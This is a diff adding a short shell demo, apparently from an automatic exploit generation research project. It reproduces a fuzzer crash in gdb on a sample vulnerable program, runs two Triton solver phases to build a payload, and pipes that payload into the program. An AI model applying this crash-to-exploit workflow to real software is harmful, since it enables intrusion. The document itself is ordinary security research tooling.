@@ -1,0 +1,28 @@
+# this is demo of notes
+
+# this is crash input
+cat vuln-samples/result-notes/crashes/id:000004,sig:07,src:000000,op:havoc,rep:32
+
+
+# feed crash input
+gdb vuln-samples/notes
+
+r < vuln-samples/result-notes/crashes/id:000004,sig:07,src:000000,op:havoc,rep:32
+
+print "found that promgram crashes at $pc"
+print $pc
+
+# tell that fact to solver
+export CRASHED_AT=0x7ffff7a8c231
+
+# AEG: phase 1
+/usr/bin/time -v ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton solve-notes.py vuln-samples/notes < vuln-samples/result-notes/crashes/id:000004,sig:07,src:000000,op:havoc,rep:32
+
+# obtained new payload 'crash_inputs'
+
+# AEG: phase 2
+/usr/bin/time -v ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton solve-notes-phase-2.py vuln-samples/notes < crash_inputs
+
+# good! check if it works
+(cat exploit-payload -) | ./vuln-samples/notes
+
